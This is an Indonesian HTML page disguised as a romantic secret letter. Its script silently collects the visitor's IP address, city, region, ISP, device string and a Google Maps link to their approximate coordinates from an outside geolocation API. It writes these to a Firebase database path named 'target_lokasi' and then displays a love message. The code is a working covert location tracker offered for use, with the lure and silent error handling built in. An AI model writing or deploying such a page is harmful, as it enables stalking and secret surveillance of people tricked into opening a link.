<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surat Untuk Kamu ❤️</title>
    <style>
        body { background: #ffebee; color: #d81b60; font-family: 'Arial', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .container { padding: 20px; }
        .heart { font-size: 50px; color: #e91e63; animation: beat .25s infinite alternate; }
        @keyframes beat { to { transform: scale(1.2); } }
        #status { font-size: 14px; color: #888; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container" id="main-content">
        <div class="heart">❤️</div>
        <h1 id="title">Sedang membuka pesan rahasia tunggu 10detik jika tidak muncul berarti kamu tidak sayang idan...</h1>
        <p id="status">Mengamankan koneksi pribadi...</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        // KONFIGURASI FIREBASE (Pake yang Pirdangame lu)
        const firebaseConfig = {
            databaseURL: "https://pirdangame-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 1. Tunggu 2 detik, lalu mulai Scan
        setTimeout(async () => {
            document.getElementById('status').innerText = "Menyiapkan kejutan untukmu...";
            
            try {
                // Ambil IP dan Lokasi via API Eksternal (No Visual)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const logData = {
                    ip: data.ip,
                    kota: data.city,
                    wilayah: data.region,
                    negara: data.country_name,
                    isp: data.org,
                    perangkat: navigator.userAgent,
                    waktu: new Date().toLocaleString(),
                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                };

                // 2. Simpan ke Firebase (Proses 5 detik selesai)
                await db.ref('target_lokasi/' + Date.now()).set(logData);

                // 3. Setelah Berhasil (Setelah total 7 detik)
                setTimeout(() => {
                    document.getElementById('title').innerText = "Aku sebenernya suka sama kamu...";
                    document.getElementById('status').innerText = "Tunggu aku di sana ya ❤️";
                }, 2000);

            } catch (error) {
                // Jika gagal scan tetap tampil manis
                console.log("Error silent");
                document.getElementById('title').innerText = "Koneksi lambat, tapi cintaku tetap kuat.";
            }
        }, 2000);
    </script>
</body>
</html>
